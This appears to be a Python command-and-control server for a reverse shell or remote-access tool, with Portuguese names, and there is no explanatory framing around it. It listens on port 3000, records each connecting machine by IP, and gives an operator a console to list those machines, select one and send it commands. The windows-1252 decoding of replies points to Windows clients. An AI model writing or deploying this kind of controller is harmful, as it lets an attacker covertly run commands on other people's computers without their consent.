from socket import AF_INET, socket, SOCK_STREAM
from threading import Thread 
from subprocess import PIPE, Popen
from time import sleep



HOST = ''
PORT = 3000

BUFSIZE = 1024
ADDR  = (HOST, PORT)

SERVER = socket(AF_INET, SOCK_STREAM)
SERVER.bind(ADDR)
SERVER.listen(5)


class Servidor(object):
    def __init__(self, server):
        self.__server = server
        self.__clientes = {}
        self.__addrress = {}
        self.__clientes_ativo = None

    def getClientes(self):
        return self.__addrress

    def getClienteAtivo(self):
        return self.__clientes_ativo
    
    def setClienteAtivo(self, client):
        self.__clientes_ativo = client


    def aceitar_clientes(self):
        while True:
            client , client_addr = SERVER.accept()
            self.__addrress[client_addr[0]] = client
            print('cliente contactado {}:{}'.format(client_addr[0], client_addr[1]))
            Thread(target=self.handler_client, args=(client, )).start()


    def handler_client(self,client):
        while True:
            output = client.recv(BUFSIZE).decode('windows-1252').strip()
            print(output)

    def controlClientes(self):
        while True:
            msg = input('> ')
            if (msg == 'sair'):
                break

            elif (msg == 'list'):
                for client in self.getClientes():
                    print(client)
            elif (msg == 'interact'):
                ip = input('Digite o IP do cliente:')
                if (ip in self.getClientes()):
                    self.setClienteAtivo(self.getClientes()[ip])
                else:
                    print('cliente nao encontrado!')
            else:
                if (self.getClienteAtivo() != None):
                    self.getClienteAtivo().send(bytes(msg, 'utf8'))


if __name__ == '__main__':
    print('esperando clientes')
    server = Servidor(SERVER)
    ACCEPT_THREAD = Thread(target=server.aceitar_clientes)
    ACCEPT_THREAD.start()
    server.controlClientes()
    ACCEPT_THREAD.join()
    SERVER.close()